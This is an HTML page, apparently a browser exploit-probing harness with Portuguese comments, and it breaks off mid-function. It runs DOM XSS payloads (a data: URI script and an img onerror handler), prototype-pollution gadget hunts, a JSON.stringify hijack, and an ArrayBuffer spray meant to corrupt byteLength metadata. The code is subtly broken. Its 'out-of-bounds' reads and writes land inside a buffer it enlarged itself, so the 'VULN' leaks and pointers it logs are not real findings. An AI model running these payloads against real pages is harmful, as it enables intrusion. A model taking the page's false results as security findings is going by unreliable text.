<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Focused Tests (v12.1 Fixed PP Log)</title> <style>
        /* Estilos CSS */
        body { background: #111; color: #eee; font-family: monospace; padding: 15px; font-size: 14px; }
        #output { background: #222; border: 1px solid #444; padding: 10px; height: 50vh; overflow-y: auto; white-space: pre-wrap; margin-top: 10px; }
        .log-info { color: #6cf; } .log-test { color: #fff; font-weight: bold; margin-top: 10px; display: block; border-top: 1px dashed #555; padding-top: 5px; } .log-subtest { color: #eee; font-weight: bold; margin-left: 10px; } .log-vuln { color: #ff4444; font-weight: bold; } .log-good { color: #4CAF50; } .log-warn { color: #FFC107; } .log-error { color: #f44336; } .log-critical { color: #f0f; font-weight: bold; } .log-leak { color: #FF9800; font-weight: bold; } .log-ptr { color: #f0f; font-weight: bold; }
        #xss-target-div { border: 2px dotted red; padding: 5px; margin: 15px 0; color: yellow; min-height: 60px; overflow-y: auto; }
        #output-canvas { background: #2a2a2a; border: 1px solid #444; padding: 10px; height: 50vh; overflow-y: auto; white-space: pre-wrap; margin-top: 10px; }
        #interactive-canvas { display: block; border: 1px solid #444; margin-top: 5px; background-color: #333; cursor: default; }
        #canvas-coord-status { color: #aaa; font-size: 12px; height: 15px; }
        hr { border: 1px solid #555; margin: 20px 0; }
    </style>
</head>
<body>
    <h1>(PP Hijack JSON) - Script 1</h1>
    <p>Testa: XSS Básico, OOB R/W (Info Leak), PP Básica, PP Hijack (JSON.stringify).</p>
    <button id="runBtn" onclick="runAllTests()">Iniciar Testes PP/OOB/XSS (Script 1)</button>
    <div id="output"></div>
    <div id="xss-target-div">Área para teste de XSS DOM (Script 1).</div>

    <hr>

    <section>
        <h2>Teste de Canvas Focado (v12.1 Fixed PP Log) - Script 2</h2> <p>Foco: PP Avançado+, OOB Read+, OOB Write->Metadata, WebGL Detalhado, Quadrados.</p>
        <canvas id="interactive-canvas" width="350" height="250"></canvas>
        <div id="canvas-coord-status">Passe o mouse sobre o canvas ?</div>
        <button id="runCanvasBtn" onclick="runCanvasTest()">Iniciar Teste Canvas v12.1 (Script 2)</button>
        <div id="output-canvas"></div>
    </section>

    <script>
        // --- Script 1 Original Inteiro (PP/OOB/XSS Básico) ---
        // (Cole aqui EXATAMENTE o código do Script 1 - omitido para brevidade)
        // ...
        const outputDiv = document.getElementById('output'); const runBtn = document.getElementById('runBtn'); const SHORT_PAUSE = 50; const MEDIUM_PAUSE = 500; let leakedValueFromOOB = null; const log = (message, type = 'info') => { if (!outputDiv) return; try { const timestamp = `[${new Date().toLocaleTimeString()}]`; const sanitizedMessage = String(message).replace(/</g, "&lt;").replace(/>/g, "&gt;"); if(outputDiv.innerHTML.length > 500000){ outputDiv.innerHTML = outputDiv.innerHTML.substring(outputDiv.innerHTML.length - 250000); outputDiv.innerHTML = `<span>[Log S1 Truncado...]</span>\n` + outputDiv.innerHTML; } outputDiv.innerHTML += `<span class="log-${type}">${timestamp} ${sanitizedMessage}\n</span>`; outputDiv.scrollTop = outputDiv.scrollHeight; } catch(e) { console.error("Erro log S1:", e); outputDiv = null; } }; const toHex = (val, bits = 32) => { if (typeof val !== 'number' || !isFinite(val)) return 'NaN/Invalid'; let num = Number(val); if (bits <= 32) { num = num >>> 0; } const pad = Math.ceil(bits / 4); return '0x' + num.toString(16).toUpperCase().padStart(pad, '0'); }; const isPotentialPointer64 = (high, low) => { if (high === null || low === null || typeof high !== 'number' || typeof low !== 'number') return false; if (high === 0 && low === 0) return false; if (high === 0xFFFFFFFF && low === 0xFFFFFFFF) return false; if (high === 0xAAAAAAAA && low === 0xAAAAAAAA) return false; if (high === 0 && low < 0x100000) return false; return true; }; const isPotentialData32 = (val) => { if (val === null || typeof val !== 'number') return false; val = val >>> 0; if (val === 0 || val === 0xFFFFFFFF || val === 0xAAAAAAAA || val === 0xAAAAAAEE) return false; if (val < 0x1000) return false; return true; }; const testCSPBypass = async () => { log("--- Iniciando Teste 1: XSS Básico (Script 1) ---", 'test'); log("Tentando XSS via data: URI...", 'subtest'); await new Promise(resolve => setTimeout(resolve, SHORT_PAUSE)); try { const payloadJS = `try { alert('XSS S1 via Data URI!'); log("[Payload Data:] Alerta data: URI executado!", "vuln"); } catch(e) { log("[Payload Data:] Alerta data: URI bloqueado: " + e.message, "good"); }`; const encodedPayload = btoa(payloadJS); const scriptTag = document.createElement('script'); scriptTag.src = 'data:text/javascript;base64,' + encodedPayload; scriptTag.onerror = () => { log("ERRO: Falha carregar script data: URI!", 'error'); }; document.body.appendChild(scriptTag); log("Tag <script> data: URI adicionada.", 'info'); } catch (e) { log(`Erro script data: URI: ${e.message}`, 'error'); } await new Promise(resolve => setTimeout(resolve, SHORT_PAUSE * 2)); log("Tentando XSS DOM via onerror...", 'subtest'); await new Promise(resolve => setTimeout(resolve, SHORT_PAUSE)); try { const imgTag = document.createElement('img'); imgTag.src = 'invalid_img_' + Date.now(); const onerrorPayload = ` try { const target = document.getElementById('xss-target-div'); if (target) { target.innerHTML += '<br><span class="log-vuln">XSS S1 DOM via ONERROR Executado!</span>'; log("XSS DOM via onerror OK!", "vuln"); } else { log("Alvo XSS DOM não encontrado.", "error"); } alert('XSS_S1_DOM_ONERROR'); } catch(e) { log("Erro payload onerror: " + e.message, "warn"); } `; imgTag.setAttribute('onerror', onerrorPayload); document.body.appendChild(imgTag); log("Tag <img> com onerror adicionada.", 'info'); } catch (e) { log(`Erro img onerror: ${e.message}`, 'error'); } log("--- Teste 1 Concluído ---", 'test'); }; const testOOBReadInfoLeakEnhancedStore = async () => { log("--- Iniciando Teste 2: OOB Write/Read (Leak) ---", 'test'); const bufferSize = 32; const writeValue = 0xEE; const oobWriteOffset = 32; const oobReadOffsets = []; for (let i = -64; i < bufferSize + 64; i += 4) { oobReadOffsets.push(i); } let writeSuccess = false; let potentialLeakFoundCount = 0; leakedValueFromOOB = null; try { const buffer = new ArrayBuffer(bufferSize + 256); const dataView = new DataView(buffer); const baseOffset = 128; for (let i = 0; i < buffer.byteLength; i++) { dataView.setUint8(i, 0xAA); } const writeTargetAddress = baseOffset + oobWriteOffset; log(`Tentando escrita OOB U8 @${oobWriteOffset}...`, 'subtest'); await new Promise(resolve => setTimeout(resolve, SHORT_PAUSE)); try { dataView.setUint8(writeTargetAddress, writeValue); log(`VULN: Escrita OOB U8 @${oobWriteOffset} OK! Val=${toHex(writeValue, 8)}`, 'vuln'); writeSuccess = true; } catch (e) { log(`BLOQ: Escrita OOB U8 @${oobWriteOffset}: ${e.message}`, 'good'); return false; } await new Promise(resolve => setTimeout(resolve, SHORT_PAUSE)); log(`Tentando leituras OOB U32/U64...`, 'subtest'); for (const readOffset of oobReadOffsets) { const readTargetAddress = baseOffset + readOffset; if (readTargetAddress < 0 || readTargetAddress + 8 > buffer.byteLength) continue; try { const low = dataView.getUint32(readTargetAddress, true); const high = dataView.getUint32(readTargetAddress + 4, true); if (isPotentialPointer64(high, low)) { const vStr = `H=${toHex(high)} L=${toHex(low)}`; log(` -> PTR? U64 @${readOffset}: ${vStr}`, 'ptr'); potentialLeakFoundCount++; if (leakedValueFromOOB === null) { leakedValueFromOOB = { high, low, type: 'U64', offset: readOffset }; log(` -> VALOR U64 ARMAZENADO @${readOffset}.`, 'vuln'); } } } catch (e) {} if (leakedValueFromOOB === null && readTargetAddress + 4 <= buffer.byteLength ) { try { const val32 = dataView.getUint32(readTargetAddress, true); if (isPotentialData32(val32)) { log(` -> Leak U32? @${readOffset}: ${toHex(val32)}`, 'leak'); potentialLeakFoundCount++; leakedValueFromOOB = { high: 0, low: val32, type: 'U32', offset: readOffset }; log(` -> VALOR U32 ARMAZENADO @${readOffset}.`, 'vuln'); } if (readOffset === oobWriteOffset && val32 === (writeValue | (0xAA << 8) | (0xAA << 16) | (0xAA << 24))) { log(` -> Leu valor OOB escrito (${toHex(val32)}) @${readOffset}!`, 'vuln'); } } catch (e) {} } if (readOffset % 32 === 0) await new Promise(resolve => setTimeout(resolve, 1)); } } catch (e) { log(`Erro teste Info Leak: ${e.message}`, 'error'); } log(`--- Teste 2 Concluído (${potentialLeakFoundCount} leaks?, ${leakedValueFromOOB ? `1 valor ${leakedValueFromOOB.type} @${leakedValueFromOOB.offset}` : 'nenhum'}) ---`, 'test'); return writeSuccess; }; const testBasicPP = async () => { log("--- Iniciando Teste 3: PP (Básica) ---", 'test'); const prop = '__pp_basic__'; const val = 'Polluted!'; let ok = false; try { log(`Poluindo Object.prototype.${prop} = "${val}"`, 'subtest'); Object.prototype[prop] = val; log("Verificando herança {}...", 'subtest'); await new Promise(resolve => setTimeout(resolve, SHORT_PAUSE)); const o = {}; if (o[prop] === val) { log(`VULN: PP Básica OK!`, 'vuln'); ok = true; } else { log(`FALHA: PP Básica não OK.`, 'good'); } } catch (e) { log(`Erro teste PP Básico: ${e.message}`, 'error'); } finally { try { delete Object.prototype[prop]; } catch(e){} log(`Limpeza Object.prototype.${prop} OK.`, 'info'); } log(`--- Teste 3 Concluído (PP Básica ${ok ? 'OK' : 'Falhou'}) ---`, 'test'); return ok; }; const testPPJsonHijack = async () => { log("--- Iniciando Teste 4: PP Hijack (JSON.stringify) ---", 'test'); const orig = JSON.stringify; let okH = false; let okL = false; let okR = false; try { log("Sobrescrevendo JSON.stringify...", 'subtest'); JSON.stringify = function hijacked(v, r, s) { log("===> VULN: JSON.stringify SEQUESTRADO! <===", 'vuln'); okH = true; log(` -> Lendo leak T2...`, 'info'); try { const l = leakedValueFromOOB; let lStr = "NULO"; if (l) { lStr = l.type === 'U64' ? `U64 H=${toHex(l.high)} L=${toHex(l.low)}` : `U32 ${toHex(l.low)}`; okL = true; } log(` -> Valor OOB: ${lStr}`, okL ? 'leak' : 'warn'); } catch(ie) { log(` -> Erro ler leak: ${ie.message}`, 'error'); } return '{"hijacked": true, "leak": ' + okL + '}'; }; log("Testando JSON.stringify...", 'subtest'); await new Promise(resolve => setTimeout(resolve, SHORT_PAUSE)); const tO = {a:1}; log(`Obj original (via original): ${orig(tO)}`, 'info'); const res = JSON.stringify(tO); log(`Resultado: ${res}`, 'info'); if (res && res.includes('"hijacked": true')) { log("VULN: Retorno hijack JSON.stringify OK!", 'vuln'); okR = true; } else if (okH) { log("AVISO: Hijack OK, retorno !OK.", 'warn'); } else { log("FALHA: Hijack JSON.stringify.", 'good'); } } catch (e) { log(`Erro PP Hijack JSON: ${e.message}`, 'error'); } finally { JSON.stringify = orig; log("JSON.stringify restaurado.", 'info'); if (JSON.stringify !== orig) log("ERRO CRÍTICO: FALHA restaurar JSON.stringify!", 'critical'); } log(`--- Teste 4 Concluído (Hijack JSON ${okR ? 'OK' : 'Falhou'}) ---`, 'test'); return okR; }; const runAllTests = async () => { if (runBtn) runBtn.disabled = true; log("==== INICIANDO Script 1 (PP/OOB/XSS Básico) ====", 'test'); await testCSPBypass(); await new Promise(resolve => setTimeout(resolve, MEDIUM_PAUSE)); await testOOBReadInfoLeakEnhancedStore(); await new Promise(resolve => setTimeout(resolve, MEDIUM_PAUSE)); await testBasicPP(); await new Promise(resolve => setTimeout(resolve, MEDIUM_PAUSE)); await testPPJsonHijack(); await new Promise(resolve => setTimeout(resolve, MEDIUM_PAUSE)); log("\n==== Script 1 CONCLUÍDO ====", 'test'); if (runBtn) runBtn.disabled = false; };

    </script>

    <script>
        // --- Script 2: Canvas Exploração Focada (v12.1 Fixed PP Log) ---

        // --- Variáveis Globais do Script 2 ---
        const SHORT_PAUSE_CANVAS = 50;
        let canvasClickListener = null; let canvasMoveListener = null; let currentHoverTarget = null;
        const interactiveAreas = [ { id: 'rect-log', x: 10, y: 10, w: 80, h: 30, color: '#FF5733', hoverColor: '#FF8C66', text: 'Log Click' }, { id: 'rect-link', x: 100, y: 10, w: 80, h: 30, color: '#337BFF', hoverColor: '#66A3FF', text: 'Abrir Link' }, { id: 'rect-rerun', x: 190, y: 10, w: 100, h: 30, color: '#4CAF50', hoverColor: '#80C883', text: 'Re-ler Leak S1' } ];
        const imgSquareSize = 20; const imgSquareSpacing = 5; const imgSquares = []; const imgSquaresStartY = 205;
        let currentLeakData = { text: "Leak(S1): N/A", color: "#AAAAAA" };
        let outputDivCanvas = null; let coordStatusDiv = null; let canvasElement = null; let ctx = null; let glContext = null; let isWebGL2 = false;

        // --- Funções Helper ---
        const logCanvas = (message, type = 'info') => { if (!outputDivCanvas) return; const logMsg = `[CANVAS-${type.toUpperCase()}] ${message}`; console.log(logMsg); try { const timestamp = `[${new Date().toLocaleTimeString()}]`; const sM = String(message).replace(/</g, "&lt;").replace(/>/g, "&gt;"); if(outputDivCanvas.innerHTML.length > 750000){ outputDivCanvas.innerHTML = outputDivCanvas.innerHTML.substring(outputDivCanvas.innerHTML.length - 350000); outputDivCanvas.innerHTML = `<span>[Log S2 Truncado...]</span>\n` + outputDivCanvas.innerHTML; } const lC = ['info', 'test', 'subtest', 'vuln', 'good', 'warn', 'error', 'leak', 'ptr', 'critical'].includes(type) ? type : 'info'; outputDivCanvas.innerHTML += `<span class="log-${lC}">${timestamp} ${sM}\n</span>`; outputDivCanvas.scrollTop = outputDivCanvas.scrollHeight; } catch(e) { console.error("logCanvas ERRO:", e); } };
        const PAUSE = (ms = SHORT_PAUSE_CANVAS) => new Promise(r => setTimeout(r, ms));
        const toHexCanvas = (val, bits = 32) => { if (typeof val !== 'number' || !isFinite(val)) return 'NaN/Invalid'; let n = Number(val); if (bits <= 32) { n >>>= 0; } const p = Math.ceil(bits / 4); return '0x' + n.toString(16).toUpperCase().padStart(p, '0'); };
        const isPotentialPointer64_S2 = (high, low) => { if (high === null || low === null || typeof high !== 'number' || typeof low !== 'number') return false; if (high === 0 && low === 0) return false; if (high === 0xFFFFFFFF && low === 0xFFFFFFFF) return false; if (high === 0xAAAAAAAA && low === 0xAAAAAAAA) return false; if (high === 0 && low < 0x100000) return false; return true; };
        const drawInteractiveAreas = () => { if (!ctx) return; try { interactiveAreas.forEach(a => { ctx.fillStyle = (currentHoverTarget === a.id)?a.hoverColor:a.color; ctx.fillRect(a.x, a.y, a.w, a.h); ctx.fillStyle="#FFF"; ctx.font="bold 12px mono"; ctx.textAlign="center"; ctx.fillText(a.text, a.x + a.w / 2, a.y + a.h / 2 + 4); }); ctx.textAlign="start"; } catch(e) { logCanvas(`Erro drawAreas: ${e.message}`, 'error'); }};
        const drawImageSquares = () => { if (!ctx) return; try { imgSquares.forEach(sq => { ctx.fillStyle = sq.hover ? 'yellow' : sq.color; ctx.fillRect(sq.x, sq.y, sq.size, sq.size); ctx.strokeStyle = '#888'; ctx.strokeRect(sq.x, sq.y, sq.size, sq.size); }); } catch(e) { logCanvas(`Erro drawSquares: ${e.message}`, 'error'); }};
        const redrawAll = () => { if (!ctx || !canvasElement) return; try { ctx.save(); ctx.clearRect(0, 0, canvasElement.width, canvasElement.height); ctx.fillStyle = "#334"; ctx.fillRect(0, 0, canvasElement.width, canvasElement.height); drawInteractiveAreas(); drawImageSquares(); ctx.fillStyle = currentLeakData.color; ctx.font = "12px mono"; ctx.textAlign = "start"; ctx.fillText(currentLeakData.text, 10, canvasElement.height - 5); ctx.restore(); } catch(e) { logCanvas(`Erro redrawAll: ${e.message}`, 'error'); }};

        // ===========================================================
        // === DEFINIÇÕES DAS FUNÇÕES DE TESTE FOCADAS (Script 2) ===
        // ===========================================================

        // --- Teste WebGL Check ---
        const testWebGLCheck = async () => { logCanvas("--- Teste: Verificação WebGL ---",'test'); glContext=null; isWebGL2=false; try { glContext=canvasElement.getContext('webgl')||canvasElement.getContext('experimental-webgl'); if(glContext){logCanvas(`WebGL OK! V:${glContext.getParameter(glContext.VERSION)}`,'vuln'); try{let gl2=canvasElement.getContext('webgl2'); if(gl2){logCanvas(`WebGL2 OK! V:${gl2.getParameter(gl2.VERSION)}`,'vuln'); isWebGL2=true;}}catch(e2){logCanvas(`Erro check GL2: ${e2.message}`,'warn');}}else{logCanvas('WebGL N/A.','good');}}catch(e){logCanvas(`Erro verif WebGL: ${e.message}`,'error');glContext=null;} logCanvas(`--- Teste Verificação WebGL Concluído (Ativo: ${!!glContext}) ---`,'test'); await PAUSE(); };

        // --- Teste PP Avançado (CORRIGIDO) ---
        const testAdvancedPP = async () => {
             logCanvas("--- Teste: PP Avançado (Gadgets+) ---", 'test');
             const propsToPollute = [ 'constructor', '__proto__', 'isAdmin', 'nodeType', 'href', 'innerHTML', 'src', 'style', 'onclick', 'onerror', 'valueOf', 'toString', 'map', 'call', 'apply' ];
             const testValue = "PP_Adv_Polluted"; let successCount = 0;

             for (const prop of propsToPollute) {
                 let targetProto = Object.prototype;
                 let targetProtoName = 'Object'; // Nome padrão para log seguro
                 if (['map', 'filter', 'reduce'].includes(prop)) { targetProto = Array.prototype; targetProtoName = 'Array'; }
                 if (['call', 'apply', 'bind'].includes(prop)) { targetProto = Function.prototype; targetProtoName = 'Function'; }
                 if (['src', 'href', 'style', 'onclick', 'onerror', 'innerHTML', 'srcdoc'].includes(prop)) { targetProto = Element.prototype; targetProtoName = 'Element'; }

                 // Log SEGURO, usando o nome que determinamos ANTES de poluir
                 logCanvas(`Poluindo ${targetProtoName}.prototype.${prop} = "${testValue}"`, 'subtest');

                 let inherited = false; let gadgetMsg = null; let errorMsg = null;
                 let originalConstructor = null; // Para restaurar 'constructor'
                 try {
                     // Salva o construtor original APENAS se for poluir 'constructor'
                     if (prop === 'constructor') {
                         originalConstructor = targetProto.constructor;
                     }

                     targetProto[prop] = testValue; // Polui

                     let obj; // Cria objeto apropriado para teste
                     if (targetProto === Array.prototype) obj = [];
                     else if (targetProto === Function.prototype) obj = function(){};
                     else if (targetProto === Element.prototype) obj = document.createElement('div');
                     else obj = {};

                     // Verifica herança
                     inherited = (obj[prop] === testValue);
                     if (inherited) { logCanvas(`-> VULN: Herança de '${prop}' OK.`, 'vuln'); successCount++; }
                     else { logCanvas(`-> FAIL: Herança de '${prop}' não OK.`, 'good'); }

                     // Testes de Gadgets
                     if (prop === 'isAdmin' && inherited) { const u={}; if(u.isAdmin === testValue) gadgetMsg = 'Potencial bypass isAdmin!';}
                     if (prop === 'href' && inherited) { const a=document.createElement('a'); if(a.href === testValue) gadgetMsg = 'PP afetou attr DOM `href`!';}
                     if (prop === 'src' && inherited) { const img=document.createElement('img'); if(img.src === testValue) gadgetMsg = 'PP afetou attr DOM `src`!';}
                     if (prop === 'onclick' && inherited) { const btn=document.createElement('button'); if(btn.onclick === testValue) gadgetMsg = 'PP afetou handler `onclick`!';}
                     if (prop === 'map' && Array.prototype.map === testValue) { try { [].map(()=>{}); } catch(e){ gadgetMsg = "Array.map quebrou! "+e.message; } }
                     if (prop === 'call' && Function.prototype.call === testValue) { try { function f(){}; f.call(); } catch(e){ gadgetMsg = "Function.call quebrou! "+e.message; } }

                     if (gadgetMsg) logCanvas(`-> GADGET? ${gadgetMsg}`, 'critical');

                 } catch (e) { logCanvas(`Erro poluir/testar '${prop}': ${e.message}`, 'error'); errorMsg = e.message; }
                 finally {
                     // Limpa do prototype correto
                     try { delete targetProto[prop]; } catch(e) {}
                     // Restaura construtor se ele foi salvo
                     if (prop === 'constructor' && originalConstructor && targetProto.constructor !== originalConstructor) {
                          try { targetProto.constructor = originalConstructor; logCanvas(`   (constructor restaurado para ${targetProtoName})`, 'info');} catch(e){}
                     }
                 }
                 await PAUSE(10);
             }
             // Teste gadget input.value (mantido)
              let gadgetInputOK = false; try { logCanvas("Testando gadget PP -> input.value...", 'subtest'); Object.prototype.value = "PP_Injected_Value"; const input = document.createElement('input'); if (input.value === "PP_Injected_Value") { logCanvas("-> GADGET VULN: PP afetou 'input.value'!", 'critical'); gadgetInputOK = true; successCount++; } else { logCanvas("-> GADGET FAIL: PP não afetou 'input.value'.", 'good'); } } catch (e) { logCanvas(`Erro gadget input.value: ${e.message}`, 'error');} finally { delete Object.prototype.value; }

             logCanvas(`--- Teste PP Avançado Concluído (${successCount} poluições/gadgets OK) ---`, 'test'); await PAUSE();
        };


         // --- Teste OOB Read Enhanced ---
         const testOOBReadEnhanced = async () => { logCanvas("--- Teste: OOB Read Enhanced Scan ---",'test'); const bufferSize=32; const readRangeStart=-128; const readRangeEnd=bufferSize+128; let potentialLeakFoundCount=0; const foundPointers=[]; try{const buffer=new ArrayBuffer(bufferSize+512); const dataView=new DataView(buffer); const baseOffset=256; for(let i=0; i<buffer.byteLength; i++){dataView.setUint8(i, 0xCC);} logCanvas(`Leituras OOB U32/U64 de ${readRangeStart} a ${readRangeEnd} (relativo)...`,'subtest'); for(let readOffset=readRangeStart; readOffset<readRangeEnd; readOffset+=4){const readTargetAddress=baseOffset+readOffset; if(readTargetAddress<0)continue; if(readTargetAddress+8<=buffer.byteLength){try{const low=dataView.getUint32(readTargetAddress,true); const high=dataView.getUint32(readTargetAddress+4,true); if(isPotentialPointer64_S2(high,low)){const valueStr=`H=${toHexCanvas(high,32)} L=${toHexCanvas(low,32)}`; logCanvas(` -> PTR? U64 @${readOffset}: ${valueStr}`,'ptr'); potentialLeakFoundCount++; foundPointers.push({offset:readOffset, type:'U64', high, low, hex:valueStr});}}catch(e){}} if(readTargetAddress+4<=buffer.byteLength){try{const val32=dataView.getUint32(readTargetAddress,true); if(isPotentialData32(val32)&&!isPotentialPointer64_S2(0,val32)){logCanvas(` -> Leak U32? @${readOffset}: ${toHexCanvas(val32,32)}`,'leak'); potentialLeakFoundCount++; foundPointers.push({offset:readOffset, type:'U32', value:val32, hex:toHexCanvas(val32)});}}catch(e){}} if(readOffset%64===0)await PAUSE(1);}}catch(e){logCanvas(`Erro OOB Read Scan: ${e.message}`,'error');} logCanvas(`--- Teste OOB Read Scan Concluído (${potentialLeakFoundCount} leaks) ---`,'test'); if(foundPointers.length>0){console.log("Potenciais Leaks Encontrados:",foundPointers); logCanvas(`-> ${foundPointers.length} leaks logados no console.`,'info');} await PAUSE(); return foundPointers; };

        // --- Teste OOB Write -> Metadata ---
        const testOOBWriteMetadata = async () => { logCanvas("--- Teste: OOB Write -> Metadata (byteLength) ---",'test'); const controlBufferSize=64; const targetBufferSize=64; const sprayCount=50; const targetValue=0x7FFFFFFF; const targetBuffers=[]; let controlBuffer=null; let dv=null; let writeSuccess=false; let corruptionSuccess=false; try{controlBuffer=new ArrayBuffer(controlBufferSize+256); dv=new DataView(controlBuffer); for(let i=0; i<controlBuffer.byteLength; i++)dv.setUint8(i, 0xDD); logCanvas(`Buffer ctrl OK (${controlBuffer.byteLength}B).`,'info');}catch(e){logCanvas(`Erro alloc ctrl: ${e.message}`,'error'); return;} logCanvas(`Spray ${sprayCount} ArrayBuffers alvo (${targetBufferSize}B)...`,'subtest'); for(let i=0; i<sprayCount; i++){try{targetBuffers.push(new ArrayBuffer(targetBufferSize));}catch(e){logCanvas(`Warn: Falha criar AB ${i}: ${e.message}`,'warn'); break;}} logCanvas(`${targetBuffers.length} ArrayBuffers alvo criados.`,'good'); await PAUSE(); const writeBaseOffset=128; const oobBaseWriteOffset=writeBaseOffset+controlBufferSize; const metadataOffsetsToTry=[8,12,16,20,24]; let foundOffset=-1; for(const tryOffset of metadataOffsetsToTry){const targetWriteAddr=oobBaseWriteOffset+tryOffset; logCanvas(`Tentando OOB Write U32 @${targetWriteAddr} (rel=${controlBufferSize+tryOffset})...`,'subtest'); let currentWriteOK=false; try{if(targetWriteAddr+4<=controlBuffer.byteLength){dv.setUint32(targetWriteAddr,targetValue,true); logCanvas(`-> Escrita OOB U32 @${targetWriteAddr} OK (Val=${toHexCanvas(targetValue)}).`,'vuln'); writeSuccess=true; currentWriteOK=true;}else{logCanvas(`-> Offset @${targetWriteAddr} fora do AB maior.`,'error');}}catch(e){logCanvas(`-> Escrita OOB U32 @${targetWriteAddr} falhou: ${e.message}`,'warn');} if(currentWriteOK){for(let j=0; j<targetBuffers.length; j++){if(targetBuffers[j].byteLength===targetValue){logCanvas(`---> VULN: AB ${j} byteLength CORROMPIDO para ${targetValue} com offset rel +${tryOffset}! <---`,'critical'); corruptionSuccess=true; foundOffset=tryOffset; try{const corruptedView=new DataView(targetBuffers[j]); const readOOB=corruptedView.getUint32(targetBufferSize+4,true); logCanvas(`   -> Leitura OOB via AB ${j} corrompido @${targetBufferSize+4}: ${toHexCanvas(readOOB)}`,'leak');}catch(e){logCanvas(`   -> Leitura OOB via AB ${j} corrompido falhou: ${e.message}`,'warn');} break;}} try{dv.setUint32(targetWriteAddr,0,true);}catch(e){}} if(corruptionSuccess)break; await PAUSE(10);} if(corruptionSuccess){logCanvas(`SUCESSO! byteLength corrompido usando offset OOB rel +${foundOffset}.`,'vuln');} else if(writeSuccess){logCanvas(`Escrita OOB permitida, mas byteLength não corrompido.`, 'warn');} else{logCanvas(`Escrita OOB falhou/bloqueada.`, 'good');} logCanvas("--- Teste OOB Write -> Metadata Concluído ---",'test'); await PAUSE(); };

        // --- Teste WebGL Aprofundado (Expandido) ---
        const testWebGLDeeperPlus = async () => { if(!glContext){logCanvas("--- Teste: WebGL Deep Plus Pulado (N/A) ---",'test'); return;} logCanvas(`--- Teste: WebGL Deep Plus c/ Checks (${isWebGL2?'WebGL2':'WebGL1'}) ---`,'test'); let gl=glContext; let pgm=null, buf=null, vs=null, fs=null, tex=null; let step='init'; let glError=gl.NO_ERROR; const errors=[]; const checkGLError=(s)=>{let found=false; while((glError=gl.getError())!==gl.NO_ERROR){const eStr=`GL Err ${glError} (0x${glError.toString(16)}) after ${s}`; logCanvas(eStr,'error'); errors.push(eStr); found=true;} return !found;}; try{logCanvas(`Ctx WebGL OK: ${gl.getParameter(gl.VERSION)}`,'good'); checkGLError('getParam(VER)'); step='compileShaders'; logCanvas("Shader/Pgm...",'subtest'); const vsSrc=`attribute vec4 p;void main(){gl_Position=p;}`; const fsSrc=`precision mediump float; uniform sampler2D u_tex; void main(){ gl_FragColor = texture2D(u_tex, vec2(0.1, 0.1)) * vec4(1.,${isWebGL2?'.5':'0.'},1.,1.); }`; vs=gl.createShader(gl.VERTEX_SHADER); if(!checkGLError('createShader(VS)'))throw new Error('GL Err'); gl.shaderSource(vs,vsSrc); if(!checkGLError('shaderSource(VS)'))throw new Error('GL Err'); gl.compileShader(vs); if(!checkGLError('compileShader(VS)'))throw new Error('GL Err'); if(!gl.getShaderParameter(vs,gl.COMPILE_STATUS)){throw new Error(`VS Compile: ${gl.getShaderInfoLog(vs)}`);} fs=gl.createShader(gl.FRAGMENT_SHADER); if(!checkGLError('createShader(FS)'))throw new Error('GL Err'); gl.shaderSource(fs,fsSrc); if(!checkGLError('shaderSource(FS)'))throw new Error('GL Err'); gl.compileShader(fs); if(!checkGLError('compileShader(FS)'))throw new Error('GL Err'); if(!gl.getShaderParameter(fs,gl.COMPILE_STATUS)){throw new Error(`FS Compile: ${gl.getShaderInfoLog(fs)}`);} logCanvas("Shaders compilados OK.",'good'); step='linkProgram'; pgm=gl.createProgram(); if(!checkGLError('createProgram'))throw new Error('GL Err'); gl.attachShader(pgm,vs); if(!checkGLError('attachVS'))throw new Error('GL Err'); gl.attachShader(pgm,fs); if(!checkGLError('attachFS'))throw new Error('GL Err'); gl.linkProgram(pgm); if(!checkGLError('linkProgram'))throw new Error('GL Err'); if(!gl.getProgramParameter(pgm,gl.LINK_STATUS)){throw new Error(`Link: ${gl.getProgramInfoLog(pgm)}`);} gl.useProgram(pgm); if(!checkGLError('useProgram'))throw new Error('GL Err'); logCanvas("Programa linkado OK.",'good'); step='textureSetup'; logCanvas("Textura (do Canvas 2D)...",'subtest'); tex=gl.createTexture(); if(!checkGLError('createTexture'))throw new Error('GL Err'); gl.bindTexture(gl.TEXTURE_2D,tex); if(!checkGLError('bindTexture'))throw new Error('GL Err'); if(ctx){ctx.save(); ctx.fillStyle='lime'; ctx.fillRect(50,150,40,40); ctx.fillStyle='black'; ctx.fillText('TEX',55,175); ctx.restore();} await PAUSE(20); gl.texImage2D(gl.TEXTURE_2D,0,gl.RGBA,gl.RGBA,gl.UNSIGNED_BYTE,canvasElement); if(!checkGLError('texImage2D'))throw new Error('GL Err'); gl.texParameteri(gl.TEXTURE_2D,gl.TEXTURE_MAG_FILTER,gl.NEAREST); if(!checkGLError('texParamMag'))throw new Error('GL Err'); gl.texParameteri(gl.TEXTURE_2D,gl.TEXTURE_MIN_FILTER,gl.NEAREST); if(!checkGLError('texParamMin'))throw new Error('GL Err'); gl.texParameteri(gl.TEXTURE_2D,gl.TEXTURE_WRAP_S,gl.CLAMP_TO_EDGE); if(!checkGLError('texParamWrapS'))throw new Error('GL Err'); gl.texParameteri(gl.TEXTURE_2D,gl.TEXTURE_WRAP_T,gl.CLAMP_TO_EDGE); if(!checkGLError('texParamWrapT'))throw new Error('GL Err'); logCanvas("Textura criada do canvas OK.",'good'); step='uniformTex'; const texLoc = gl.getUniformLocation(pgm, 'u_tex'); if(!checkGLError('getUniLocTex'))throw new Error('GL Err'); if(texLoc){ gl.uniform1i(texLoc, 0); if(!checkGLError('uniform1i'))throw new Error('GL Err'); logCanvas("Uniform textura OK.",'good');} else {logCanvas("Uniform u_tex N/A.", 'warn');} step='createBufferDraw'; logCanvas("Buffer/Draw (Triângulo c/ Textura?)...",'subtest'); buf=gl.createBuffer(); if(!checkGLError('createBuf'))throw new Error('GL Err'); gl.bindBuffer(gl.ARRAY_BUFFER,buf); if(!checkGLError('bindBuf'))throw new Error('GL Err'); const pos=[0,.8,0,-.8,-.8,0,.8,-.8,0]; gl.bufferData(gl.ARRAY_BUFFER,new Float32Array(pos),gl.STATIC_DRAW); if(!checkGLError('bufData'))throw new Error('GL Err'); step='vertexAttrib'; const loc=gl.getAttribLocation(pgm,"p"); if(!checkGLError('getAttribLoc'))throw new Error('GL Err'); gl.enableVertexAttribArray(loc); if(!checkGLError('enableVA'))throw new Error('GL Err'); 